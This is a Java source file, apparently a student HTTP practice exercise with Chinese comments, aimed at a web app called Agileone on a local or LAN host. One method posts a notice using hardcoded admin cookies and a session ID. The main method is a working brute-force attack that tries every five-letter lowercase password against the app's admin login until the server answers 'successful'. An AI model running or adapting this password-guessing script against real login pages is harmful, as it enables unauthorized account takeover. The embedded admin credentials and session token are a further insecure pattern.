package ryan.httpio;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class HttpPractise {
	public static void main(String[] args) {
		try {
			new HttpPractise().practise3();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void practise2() throws Exception {
		// 创建URL对象
		URL url = new URL("http://localhost/Agileone_1.2/index.php/notice/add");
		// 获取HttpURLConnection对象
		HttpURLConnection con = (HttpURLConnection) url.openConnection();
		// 设置连接参数
		con.setRequestMethod("POST");
		con.addRequestProperty("Cookie",
				"username=admin; password=admin; PHPSESSID=7eb68675d9c13d787cb240f4f43e5ff6");
		con.setDoOutput(true);

		// 建立TCP连接
		con.connect();
		// 获取输出流
		OutputStream os = con.getOutputStream();
		os.write("headline=test1&content=conten1&scope=1&expireddate=2018-03-05"
				.getBytes());
		// 获取输入流
		InputStream is = con.getInputStream();
		BufferedReader br = new BufferedReader(new InputStreamReader(is));
		String str = null;
		while ((str = br.readLine()) != null) {
			System.out.println(str);
		}
		// 释放资源
		br.close();
		is.close();
		os.close();
		con.disconnect();
	}

	public void practise3() {
		// 怎样从a取到z
		String pass = "";
		String realPass="";
		for (int i = 97; i < 123; i++) {
			for (int j = 97; j < 123; j++) {
				for (int k = 97; k < 123; k++) {
					for (int l = 97; l < 123; l++) {
						for (int m = 97; m < 123; m++) {
							pass = "" + (char) i + (char) j + (char) k
									+ (char) l + (char) m;
//							System.out.println(pass);
							realPass = HttpPractise.getRealPass(pass);
							if(realPass != null){
								System.out.println(realPass);
								System.exit(0);
							}
						}
					}
				}
			}
		}
	}

	public static String getRealPass(String pass) {
		String realPass = null;
		// 目标URL
		String urlPath = "http://192.168.11.44/Agileone_1.2/index.php/common/login";
		// 创建URL对象，对目标URL进行封装
		try {
			URL url = new URL(urlPath);
			// 获取HttpURLConnection对象
			HttpURLConnection httpURL = (HttpURLConnection) url
					.openConnection();
			// 设置连接参数
			httpURL.setRequestMethod("POST");
			httpURL.setDoOutput(true);
			httpURL.setConnectTimeout(120000);
			httpURL.setReadTimeout(120000);
			httpURL.setRequestProperty("Cookie",
					"PHPSESSID=7eb68675d9c13d787cb240f4f43e5ff6");
			// 建立TCP连接
			httpURL.connect();
			// 获取输出流
			OutputStream os = httpURL.getOutputStream();
			// 准备请求正文
			String par = "username=admin&password="+pass+"&savelogin=true";
			// 将请求正文发送给服务器
			os.write(par.getBytes());
			// 获取输入流，读取服务器响应内容
			InputStream is = httpURL.getInputStream();
			BufferedInputStream bi = new BufferedInputStream(is);
			int len = 0;
			byte[] con = new byte[1024];
			while ((len = bi.read(con)) != -1) {
//				System.out.println(new String(con, 0, len));
				if(new String(con, 0, len).startsWith("successful")){
					realPass=pass;
				}
			}
			// 释放资源
			bi.close();
			is.close();
			os.close();
			httpURL.disconnect();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return realPass;
	}
}
